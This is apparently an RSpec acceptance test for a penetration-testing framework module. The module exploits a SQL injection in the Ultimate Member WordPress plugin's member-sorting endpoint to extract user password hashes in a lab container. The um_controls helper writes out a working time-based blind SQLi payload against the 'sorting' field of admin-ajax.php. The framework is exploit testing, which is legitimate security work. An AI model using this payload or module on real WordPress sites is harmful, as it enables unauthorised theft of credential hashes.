require 'acceptance_spec_helper'
require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'socket'
require 'uri'

RSpec.describe 'Ultimate Member genuine SQLi targets', acceptance: true, order: :defined do
  include_context 'module target'

  before(:all) do
    @um = { commands: [], requests: [], calls: [], reports: [], controls: [], loot: [] }
    @release = ENV.fetch('ULTIMATE_MEMBER_RELEASE', '2.8.2')
    @mode = ENV.fetch('ULTIMATE_MEMBER_MODE', 'enabled')
    @prefix = ENV.fetch('ULTIMATE_MEMBER_PREFIX', '')
    @count = Integer(ENV.fetch('ULTIMATE_MEMBER_COUNT', '1'))
    @roles = ENV.fetch('ULTIMATE_MEMBER_DIRECTORY_ROLES', 'all')
    @custom_meta = ENV.fetch('ULTIMATE_MEMBER_CUSTOM_META', '1') == '1'
    @vulnerable = @mode == 'enabled' && @release == '2.8.2' && @roles == 'all' && @custom_meta
    @base_workspace = "ultimate_member_target_#{Process.pid}"
    begin
      catalog = JSON.parse(File.read('test/module_targets/ultimate_member/releases.json')).fetch(@release)
      @baseline = um_identity('installed')
      expect(@baseline.values_at('core', 'php', 'uid', 'database', 'database_role')).to eq(['6.8.3', '8.3.28', 33, 'wp_root', 'module_target@%'])
      expect(@baseline.fetch('server')).to start_with('11.2.2-MariaDB')
      expect(@baseline.fetch('database_grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
      installed = @mode != 'absent'
      active = @mode == 'enabled'
      expect(@baseline.values_at('installed', 'active', 'plugin_version')).to eq([installed, active, installed ? @release : nil])
      expect(@baseline.fetch('installed_sha256')).to eq(installed ? catalog.fetch('installed_sha256') : {})
      expect(@baseline.fetch('archive_sha256')).to eq(catalog.fetch('sha256'))
      expect(@baseline.fetch('active_plugins')).to eq(active ? ['ultimate-member/ultimate-member.php'] : [])
      expect(@baseline.values_at('prefix', 'table_prefix')).to eq([@prefix, ENV.fetch('ULTIMATE_MEMBER_TABLE_PREFIX', 'wp_')])
      expect(@baseline.fetch('users').map { |row| row.fetch('user_login') }).to eq(%w[module_admin module_author module_subscriber module_editor])
      expect(@baseline.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
      if active
        @directory_id = @baseline.fetch('native_directories').fetch('members')
        registration = @baseline.fetch('forms_pages').find { |row| row.fetch('post_type') == 'page' && row.fetch('post_name') == 'register' }
        @registration_id = Integer(registration.fetch('ID'))
        @directory_hash = Digest::MD5.hexdigest(@directory_id.to_s)[10..14]
        expect(@baseline.fetch('custom_meta_enabled') == true || @baseline.fetch('custom_meta_enabled') == 1).to be(@custom_meta)
        expect(@baseline.fetch('directory_class')).to eq(@custom_meta ? 'um\\core\\Member_Directory_Meta' : 'um\\core\\Member_Directory')
        expect(@baseline.fetch('native_forms').keys.sort).to eq(%w[login profile register])
      else
        @registration_id = 11
        @directory_id = 8
        @directory_hash = Digest::MD5.hexdigest(@directory_id.to_s)[10..14]
        expect(@baseline.fetch('custom_usermeta')).to eq([])
      end
      um_controls('before')
      @baseline = um_identity('before')
      expect(um_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      expect(um_sql('SELECT usesuper FROM pg_user WHERE usename=current_user').strip).to eq('f')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets')
      um_workspace(@base_workspace)
      expect(um_reports.fetch('credentials')).to eq([])
      output = console_command("irb -e 'puts \"ULTIMATE_MEMBER_PROVENANCE=\" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file(\"modules/#{um_fullname}.rb\").hexdigest}.to_json'")
      @um[:provenance] = JSON.parse(output.match(/^ULTIMATE_MEMBER_PROVENANCE=(.+)$/)[1])
      expect(@um.fetch(:provenance).fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@um.fetch(:provenance).fetch('owner_sha256')).to eq(Digest::SHA256.file("modules/#{um_fullname}.rb").hexdigest)
      @um[:preflight] = 'passed'
    ensure
      um_save
    end
  end

  after(:all) do
    if @um&.key?(:preflight)
      um_controls('after')
      expect(um_identity('after')).to eq(@baseline)
      expect(console_command('irb -e \'puts "ULTIMATE_MEMBER_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('ULTIMATE_MEMBER_STATE={"sessions":[],"jobs":[]}')
      reported_paths = @um.fetch(:calls).filter_map do |call|
        output = Base64.strict_decode64(call.fetch(:output_base64, ''))
        output[/Loot saved to: (.+)$/, 1]&.strip
      end
      expect(um_loot_paths.sort).to eq(reported_paths.sort)
    end
  ensure
    um_save
  end

  Integer(ENV.fetch('ULTIMATE_MEMBER_REPEATS', '1')).times do |iteration|
    it "verifies complete data or refusal on public run #{iteration + 1}" do
      um_workspace(@base_workspace)
      um_call("normal-#{iteration + 1}", {}, expected: @vulnerable ? :credentials : :refusal)
    end
  end

  if ENV['ULTIMATE_MEMBER_NEGATIVES'] == '1'
    it 'reports a missing directory inside a bounded invalid ID range' do
      um_workspace(@base_workspace + '_missingdir')
      invalid = Integer(@directory_id) + 1000
      um_call('missing-directory', { 'DIR_ID_MIN' => invalid, 'DIR_ID_MAX' => invalid }, expected: :refusal)
    end

    it 'reports a missing nonce on the real JSON endpoint with a misplaced base path' do
      um_workspace(@base_workspace + '_missingnonce')
      um_call('missing-nonce', { 'TARGETURI' => @prefix + '/wp-json/' }, expected: :refusal)
    end

    it 'reports an unreachable reserved non-listening loopback port' do
      socket = Socket.new(:INET, :STREAM, 0)
      socket.bind(Socket.sockaddr_in(0, '127.0.0.1'))
      um_workspace(@base_workspace + '_closed')
      um_call('closed-run', { 'RPORT' => socket.local_address.ip_port, 'HttpClientTimeout' => 3 }, expected: :refusal)
    ensure
      socket&.close
    end
  end

  def um_fullname
    'auxiliary/scanner/http/wp_ultimate_member_sorting_sqli'
  end

  def um_call(label, overrides, expected:)
    endpoint = target_endpoint('app')
    options = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'TARGETURI' => @prefix + '/', 'VHOST' => 'module-target.test', 'SqliDelay' => 0.6, 'HttpClientTimeout' => 8, 'COUNT' => @count, 'PAGE_ID_MIN' => @registration_id, 'PAGE_ID_MAX' => @registration_id, 'DIR_ID_MIN' => @directory_id, 'DIR_ID_MAX' => @directory_id, 'VERBOSE' => true }
    %w[PAGE_ID_MIN PAGE_ID_MAX DIR_ID_MIN DIR_ID_MAX].each { |name| options.delete(name) } if ENV['ULTIMATE_MEMBER_DEFAULT_BOUNDS'] == '1'
    options.merge!(overrides)
    previous = um_reports.fetch('credentials')
    previous_loot = um_loot_paths
    call = { label: label, action: 'run', options: options, expected: expected, workspace: @workspace, state: 'started' }
    @um.fetch(:calls) << call
    um_save
    console_command('back')
    expect(console_command("use #{um_fullname}")).not_to match(/Failed to load|Unknown command|No results/)
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    # Capture the public console result before assertions so original module
    # exceptions remain recorded as module outcomes rather than lost receipts.
    output = console_command("run #{format_datastore_options(options)}", timeout: 900)
    call.merge!(state: 'returned', seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started, output_base64: Base64.strict_encode64(output.b))
    um_save
    rows = um_reports.fetch('credentials')
    expect(output).to include('Auxiliary module execution completed')
    expect(output).not_to match(/Unknown datastore option|Auxiliary failed|Exception|NoMethodError|RuntimeError/)
    if expected == :credentials
      expect(output).not_to include('Auxiliary aborted')
      expect(output).to include('Target is vulnerable to SQLi!', 'Loot saved to:')
      expect(rows.length).to eq(@count)
      expect(rows.map { |row| row.fetch('username') }.uniq.length).to eq(@count)
      native = @baseline.fetch('users').to_h { |row| row.values_at('user_login', 'user_pass') }
      rows.each do |row|
        expect(row.fetch('private_data')).to eq(native.fetch(row.fetch('username')))
        expect(row.values_at('private_type', 'origin_type', 'module_full_name', 'address', 'port', 'proto')).to eq(['Metasploit::Credential::NonreplayableHash', 'Metasploit::Credential::Origin::Service', um_fullname, endpoint.fetch('host'), endpoint.fetch('port'), 'tcp'])
        expect(row.fetch('service')).to match(/\Awordpress\z/i)
      end
      expect(rows).to eq(previous) unless previous.empty?
      path = output.match(/Loot saved to: (.+)$/)[1].strip
      expect(File.expand_path(path)).to start_with(File.expand_path(ENV.fetch('MSF_CFGROOT_CONFIG')) + '/')
      expected_data = rows.map { |row| "Username: #{row.fetch('username')}, Password Hash: #{row.fetch('private_data')}\n".b }
      expect(File.binread(path).lines.sort).to eq(expected_data.sort)
      expect(um_loot_paths - previous_loot).to eq([path])
      @um.fetch(:loot) << { path: path, bytes: File.size(path), sha256: Digest::SHA256.file(path).hexdigest, complete_native_rows: rows.length }
      findings = um_reports.fetch('vulns')
      expect(findings.length).to eq(1)
      expect(findings.first.fetch('name')).to eq(um_fullname)
    else
      expect(output).not_to include('Target is vulnerable to SQLi!', 'Loot saved to:')
      expect(output).to include('Auxiliary aborted due to failure:')
      expect(rows).to eq([])
      expect(um_reports.fetch('vulns')).to eq([])
      expect(um_loot_paths).to eq(previous_loot)
    end
    um_save
  ensure
    call[:console_base64] = Base64.strict_encode64(console.all_data.b) if call
    um_save
  end

  def um_loot_paths
    Dir.glob(File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*')).select { |path| File.file?(path) }
  end

  def um_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-ultimate-member.json'), JSON.pretty_generate(@um)) if @um
  end

  def um_command(label, role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '30', *arguments]
    output, error, status = Open3.capture3(*argv)
    @um.fetch(:commands) << { label: label, argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exit: status.exitstatus }
    um_save
    raise "Ultimate Member target command failed: #{label}: #{error}" unless status.success?

    output
  end

  def um_identity(label)
    JSON.parse(um_command(label, 'app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def um_http(label, path, fields: nil)
    request = fields ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    request.set_form_data(fields) if fields
    request['Host'] = 'module-target.test'
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    http.max_retries = 0
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    response = http.request(request)
    @um.fetch(:requests) << { label: label, path: path, fields: fields, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b), seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started }
    um_save
    response
  end

  def um_members(label, sorting: nil, nonce: nil, directory: nil)
    fields = { 'action' => 'um_get_members', 'nonce' => nonce || @nonce || 'missing-native-nonce', 'directory_id' => directory || @directory_hash }
    fields['sorting'] = sorting if sorting
    um_http(label, @prefix + '/wp-admin/admin-ajax.php', fields: fields)
  end

  def um_controls(phase)
    response = um_http(phase + '-login', @prefix + '/wp-login.php')
    expect(response.code).to eq('200')
    expect(response.body).to include('name="log"', 'name="pwd"')
    registration_path = @baseline.fetch('permalink_structure').empty? ? @prefix + '/?page_id=' + @registration_id.to_s : @prefix + '/register/'
    response = um_http(phase + '-registration', registration_path)
    if @mode == 'enabled'
      expect(response.code).to eq('200')
      data = response.body.match(/var um_scripts\s*=\s*(\{[^;]+\})/)
      expect(data).not_to be_nil
      @nonce = JSON.parse(data[1]).fetch('nonce')
      query = um_http(phase + '-registration-query', @prefix + '/?page_id=' + @registration_id.to_s)
      expect(%w[200 301 302]).to include(query.code)
      @um.fetch(:controls) << { phase: phase, registration_query_code: query.code, registration_query_location: query['location'], actual_page_id: @registration_id, actual_directory_id: @directory_id }
    end
    ordinary = um_members(phase + '-ordinary')
    expect(ordinary.code).to eq(@mode == 'enabled' ? '200' : '400')
    if @mode == 'enabled'
      members = JSON.parse(ordinary.body)
      expect(members.fetch('success')).to be(true)
      expected_ids = @roles == 'all' ? @baseline.fetch('users').map { |row| row.fetch('ID') }.sort : []
      expect(members.fetch('data').fetch('users').map { |row| row.fetch('id').to_s }.sort).to eq(expected_ids)
      expect(JSON.parse(um_members(phase + '-wrong-nonce', nonce: 'invalid-native-nonce').body).fetch('success')).to be(false)
      expect(JSON.parse(um_members(phase + '-wrong-directory', directory: 'not-a-directory').body).fetch('success')).to be(false)
    end
    prefix = @baseline.fetch('table_prefix')
    expect(prefix).to match(/\A[a-z_]+\z/)
    user = @baseline.fetch('users').first
    timings = {}
    [false, true].each do |truth|
      condition = "(SELECT LENGTH(user_pass) FROM #{prefix}users WHERE ID=#{user.fetch('ID')})=#{user.fetch('user_pass').bytesize + (truth ? 0 : 1)}"
      payload = 'user_login AND (SELECT -37 FROM (SELECT(IF(' + condition + ',SLEEP(0.6),0)))native_gate)'
      response = um_members(phase + '-timing-' + truth.to_s, sorting: payload)
      expect(response.code).to eq(@mode == 'enabled' ? '200' : '400')
      timings[truth] = @um.fetch(:requests).last.fetch(:seconds)
    end
    difference = timings.fetch(true) - timings.fetch(false)
    if @vulnerable
      expect(difference).to be >= 0.45
    else
      expect(difference.abs).to be < 0.4
    end
    %w[app db reporting_db].each do |role|
      %w[memory.events pids.events].each do |key|
        text = um_command(phase + role + key, role, 'cat', '/sys/fs/cgroup/' + key)
        values = text.lines.to_h do |line|
          name, value = line.split
          [name, Integer(value)]
        end
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if key == 'memory.events'
        expect(values.fetch('max')).to eq(0) if key == 'pids.events'
      end
    end
    @um.fetch(:controls) << { phase: phase, timing_seconds: timings, status: 'passed' }
    um_save
  end

  def um_workspace(name)
    @workspace = name
    expect(@workspace).to match(/\Aultimate_member_target_[0-9]+(?:_closed|_missingnonce|_missingdir)?\z/)
    expect(console_command("workspace -a #{@workspace}")).to include(@workspace)
  end

  def um_sql(query)
    um_command('sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def um_reports
    raise 'Invalid Ultimate Member workspace' unless @workspace.match?(/\Aultimate_member_target_[0-9]+(?:_closed|_missingnonce|_missingdir)?\z/)

    credentials = JSON.parse(um_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT c.id,p.username,secret.data AS private_data,secret.type AS private_type,secret.jtr_format,c.origin_type,
          o.module_full_name,s.id AS service_id,s.port,s.proto,s.name AS service,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id
        LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services s ON s.id=o.service_id LEFT JOIN hosts h ON h.id=s.host_id WHERE w.name='#{@workspace}'
      ) row
    SQL
    vulns = JSON.parse(um_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT v.id,v.name,v.info FROM vulns v JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id
        WHERE w.name='#{@workspace}'
      ) row
    SQL
    result = { 'credentials' => credentials, 'vulns' => vulns }
    @um.fetch(:reports) << { workspace: @workspace, **result }
    um_save
    result
  end
end
